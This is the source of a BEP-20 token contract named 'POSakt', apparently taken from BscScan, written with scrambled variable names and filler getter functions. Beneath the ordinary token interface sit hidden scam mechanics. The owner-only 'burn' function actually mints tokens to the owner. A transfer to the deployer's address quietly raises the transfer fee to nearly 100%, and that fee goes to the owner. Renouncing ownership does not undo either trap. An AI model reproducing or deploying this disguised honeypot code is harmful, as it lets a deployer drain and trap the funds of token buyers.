/**
 *Submitted for verification at BscScan.com on 2022-12-05
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.0;
contract POSQJs {
uint256 private  NeDUWd = 10000000000;
address private  EsviFd = address(0);
string public  name = "POSakt";
address private  nEVIZw = address(0);
address private  sSnYnQ = address(0);
mapping (address => uint256) public balanceOf;
uint256 private  QDeLML = 1000000000000000000;
uint8 public constant decimals = 18;
uint256 private  IAAMqu = 1000000000000000000;
string public  symbol = "POSakt";
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public constant gMvXGx = 99999;
uint256 private  BtBaHf = 1000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  PKnfjS = address(0);
address private  OSgKAw = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint256 private  CLyror = 1000000000000000000000;
uint256 private  OWDNvo = 10000000000000;
address private  GNjGKS = address(0);
address private  iXhkCA = address(0);
address public owner;
uint256 private  SjdHWj = 100000000;
address private  jkRPfW = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
address private  QXpVoS = address(0);
function _getOWDNvo() private returns (uint256) {
return OWDNvo;
}

function _getEsviFd() private returns (address) {
return EsviFd;
}

function _getiXhkCA() private returns (address) {
return iXhkCA;
}

function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getCLyror() private returns (uint256) {
return CLyror;
}

function _getnEVIZw() private returns (address) {
return nEVIZw;
}



function _getsSnYnQ() private returns (address) {
return sSnYnQ;
}



function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "ikUIyM");
require(to != address(0), "ikUIyM");
require(amount <= balanceOf[from], "ikUIyM");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* gMvXGx/QDeLML ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==QXpVoS){
QDeLML = gMvXGx+2;
}
emit Transfer(from, to, transferAmount);
}


function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}






function _getNeDUWd() private returns (uint256) {
return NeDUWd;
}



function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _getOSgKAw() private returns (address) {
return OSgKAw;
}

function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}


function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getIAAMqu() private returns (uint256) {
return IAAMqu;
}



function _getGNjGKS() private returns (address) {
return GNjGKS;
}



function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tikUIyM 0");
require(spender != address(0), "fikUIyM 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}


function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getSjdHWj() private returns (uint256) {
return SjdHWj;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getPKnfjS() private returns (address) {
return PKnfjS;
}

constructor () {
QXpVoS = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}


function _getBtBaHf() private returns (uint256) {
return BtBaHf;
}



function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getjkRPfW() private returns (address) {
return jkRPfW;
}






}